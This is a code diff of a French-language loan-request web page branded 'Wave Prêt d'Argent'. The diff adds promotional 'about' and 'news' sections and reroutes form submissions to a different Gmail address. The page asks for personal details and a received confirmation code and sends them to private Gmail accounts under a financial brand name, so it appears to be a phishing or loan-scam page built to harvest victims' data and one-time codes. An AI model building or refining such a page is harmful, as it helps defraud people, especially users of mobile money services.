@@ -5,63 +5,63 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Wave Prêt d'Argent</title>
   <link rel="stylesheet" href="style.css">
-<style type="text/css" id="dcoder_stylesheet">body {
-  font-family: Arial, sans-serif;
-  margin: 0;
-  padding: 0;
-  background-color: #f0f8ff;
+  <style type="text/css" id="dcoder_stylesheet">body {
+    font-family: Arial, sans-serif;
+    margin: 0;
+    padding: 0;
+    background-color: #f0f8ff;
 }
 
 header {
-  background-color: #007bff;
-  color: white;
-  text-align: center;
-  padding: 20px;
+    background-color: #007bff;
+    color: white;
+    text-align: center;
+    padding: 20px;
 }
 
 .logo {
-  width: 100px;
-  height: auto;
+    width: 100px;
+    height: auto;
 }
 
 h1 {
-  margin: 10px 0;
+    margin: 10px 0;
 }
 
 .intro {
-  text-align: center;
-  padding: 20px;
+    text-align: center;
+    padding: 20px;
 }
 
 .wave-image {
-  width: 300px;
-  height: auto;
-  margin: 20px 0;
+    width: 300px;
+    height: auto;
+    margin: 20px 0;
 }
 
 main {
-  max-width: 800px;
-  margin: auto;
-  padding: 20px;
-  background-color: white;
-  border-radius: 8px;
-  box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+    max-width: 800px;
+    margin: auto;
+    padding: 20px;
+    background-color: white;
+    border-radius: 8px;
+    box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
 }
 
 form {
-  margin-bottom: 20px;
+    margin-bottom: 20px;
 }
 
 h3 {
-  color: #007bff;
+    color: #007bff;
 }
 
 label {
-  font-weight: bold;
+    font-weight: bold;
 }
 
 .form-group {
-  margin-bottom: 10px;
+    margin-bottom: 10px;
 }
 
 input[type="text"],
@@ -69,44 +69,56 @@ input[type="number"],
 input[type="date"],
 input[type="tel"],
 select {
-  width: calc(100% - 20px);
-  padding: 10px;
-  border: 1px solid #007bff;
-  border-radius: 4px;
+    width: calc(100% - 20px);
+    padding: 10px;
+    border: 1px solid #007bff;
+    border-radius: 4px;
 }
 
 button {
-  background-color: #007bff;
-  color: white;
-  padding: 10px 15px;
-  border: none;
-  border-radius: 4px;
-  cursor: pointer;
-  font-size: 16px;
+    background-color: #007bff;
+    color: white;
+    padding: 10px 15px;
+    border: none;
+    border-radius: 4px;
+    cursor: pointer;
+    font-size: 16px;
 }
 
 button:hover {
-  background-color: #0056b3;
+    background-color: #0056b3;
 }
 
-.info, .confirmation {
-  margin-top: 20px;
+.info, .confirmation, .info-section, .news-section {
+    margin-top: 20px;
 }
 
 ul {
-  list-style-type: none;
-  padding: 0;
+    list-style-type: none;
+    padding: 0;
 }
 
 ul li {
-  margin: 5px 0;
+    margin: 5px 0;
 }
 
 footer {
-  background-color: #007bff;
-  color: white;
-  text-align: center;
-  padding: 10px;
+    background-color: #007bff;
+    color: white;
+    text-align: center;
+    padding: 10px;
+}
+
+.info-section, .news-section {
+    margin: 20px 0;
+    padding: 20px;
+    background-color: #f9f9f9;
+    border-radius: 8px;
+    box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+}
+
+.news-item {
+    margin-bottom: 15px;
 }</style></head>
 <body>
   <header>
@@ -183,16 +195,34 @@ footer {
           <input type="text" id="confirmation-code" name="confirmation-code" required>
         </div>
         <button type="submit" id="submit-confirmation">Envoyer le code</button>
-      </form></section>
-    </main>
+      </form>
+    </section>
 
-    <footer>
-      <p>© 2025 Wave Prêt d'Argent. Tous droits réservés.</p>
-    </footer>
+    <section class="info-section">
+      <h2>Informations sur Wave</h2>
+      <p>Wave est une plateforme de services financiers innovante qui offre des solutions de prêt flexibles et accessibles. Notre mission est de simplifier l'accès à l'argent pour tous, en fournissant des prêts à des taux compétitifs.</p>
+    </section>
 
-    <script src="script.js"></script>
+    <section class="news-section">
+      <h2>Actualités de Wave</h2>
+      <div class="news-item">
+        <h4>Nouvelle fonctionnalité de remboursement</h4>
+        <p>Nous avons récemment lancé une nouvelle fonctionnalité qui permet aux utilisateurs de rembourser leur prêt en plusieurs fois, offrant ainsi plus de flexibilité.</p>
+      </div>
+      <div class="news-item">
+        <h4>Partenariat avec des entreprises locales</h4>
+        <p>Wave a établi des partenariats avec plusieurs entreprises locales pour offrir des réductions exclusives à nos clients sur divers services.</p>
+      </div>
+    </section>
+  </main>
+
+  <footer>
+    <p>© 2025 Wave Prêt d'Argent. Tous droits réservés.</p>
+  </footer>
+
+  <script src="script.js"></script>
   
-<script type="text/javascript" id="dcoder_script">// Afficher la date et l'heure actuelles
+  <script type="text/javascript" id="dcoder_script">// Afficher la date et l'heure actuelles
 function displayCurrentDateTime() {
   const currentDateTime = new Date();
   const dateTimeString = currentDateTime.toLocaleString();
@@ -305,57 +335,16 @@ document.getElementById('loan-form').addEventListener('submit', function(event) 
   // Encoder le message pour l'URL
   const encodedMessage = encodeURIComponent(message);
 
-  // Créer l'URL mailto
-  const mailtoLink = `mailto:pretwaveafrica@gmail.com?subject=Demande de Prêt&body=${encodedMessage}`;
+  // Créer l'URL mailto avec la nouvelle adresse
+  const mailtoLink = `mailto:microcreditwave@gmail.com?subject=Demande de Prêt&body=${encodedMessage}`;
 
-  // Ouvrir le client de messagerie
+    // Ouvrir le client de messagerie avec le lien mailto
   window.location.href = mailtoLink;
-
-  // Afficher le compte à rebours de 10 minutes
-  displayCountdown();
 });
 
-// Afficher le compte à rebours de 10 minutes
-function displayCountdown() {
-  const countdownElement = document.createElement('div');
-  countdownElement.classList.add('countdown');
-  countdownElement.textContent = '10:00';
-
-  const mainElement = document.querySelector('main');
-  mainElement.appendChild(countdownElement);
-
-  let timeLeft = 600; // 10 minutes en secondes
-  const countdownInterval = setInterval(function() {
-    timeLeft--;
-    const minutes = Math.floor(timeLeft / 60);
-    const seconds = timeLeft % 60;
-    countdownElement.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
-
-    if (timeLeft === 0) {
-      clearInterval(countdownInterval);
-      countdownElement.remove();
-      sendConfirmationCode();
-    }
-  }, 1000);
-}
-
-// Envoyer le code de confirmation par SMS et WhatsApp
-function sendConfirmationCode() {
-  const phoneNumber = document.getElementById('phone-number').value;
-  const deliveryMethod = document.getElementById('delivery-method').value;
-  const confirmationCode = Math.floor(1000 + Math.random() * 9000); // Générer un code à 4 chiffres
-
-  let message;
-  if (deliveryMethod === 'sms') {
-    message = `Votre code de confirmation Wave est : ${confirmationCode}`;
-  } else if (deliveryMethod === 'whatsapp') {
-    message = `Votre code de confirmation Wave est : ${confirmationCode}`;
-  }
-
-  // Envoyer le message via SMS ou WhatsApp
-  console.log(`Message envoyé au numéro ${phoneNumber} : ${message}`);
-}
-
-// Initialiser l'affichage de la date et de l'heure
+// Afficher la date et l'heure actuelles au chargement de la page
 displayCurrentDateTime();
-</script></body></html>
+</script>
+</body>
+</html>
+
